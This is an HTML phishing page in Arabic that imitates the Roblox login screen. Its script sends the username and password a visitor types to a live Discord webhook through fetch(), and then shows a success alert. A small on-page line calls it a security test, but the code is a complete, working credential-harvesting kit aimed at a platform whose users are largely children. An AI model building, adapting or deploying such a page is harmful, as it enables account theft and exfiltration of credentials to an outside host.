<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Roblox</title>
  <link rel="icon" href="https://www.roblox.com/favicon.ico">
  <style>
    body {
      background-color: #f2f2f2;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background-color: white;
      padding: 40px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      border-radius: 10px;
      width: 300px;
      text-align: center;
    }
    .login-box h2 {
      margin-bottom: 20px;
    }
    .login-box input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .login-box button {
      padding: 10px 20px;
      background-color: #e51c23;
      border: none;
      color: white;
      border-radius: 5px;
      cursor: pointer;
    }
    .warning {
      margin-top: 15px;
      font-size: 12px;
      color: red;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>تسجيل الدخول إلى Roblox</h2>
    <input type="text" id="username" placeholder="اسم المستخدم"><br>
    <input type="password" id="password" placeholder="كلمة المرور"><br>
    <button onclick="sendData()">تسجيل الدخول</button>
    <div class="warning">
      ⚠️ هذه صفحة تجريبية لأغراض أمنية فقط. لا تدخل معلومات حقيقية.
    </div>
  </div>

  <script>
    function sendData() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      fetch("https://discord.com/api/webhooks/1399886528976650413/8qYx68ldSTmBja7oFhQUTTxVRJy0Tv8TUG8CwfT3VILzpIsp_nkqfG5enSzVa-DeSJOI", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `📩 تجربة تسجيل دخول وهمي:\n👤 المستخدم: ${username}\n🔐 كلمة المرور: ${password}`
        })
      });

      alert("✅ تم إرسال البيانات إلى Webhook بنجاح (تجربة فقط).");
    }
  </script>
</body>
</html>
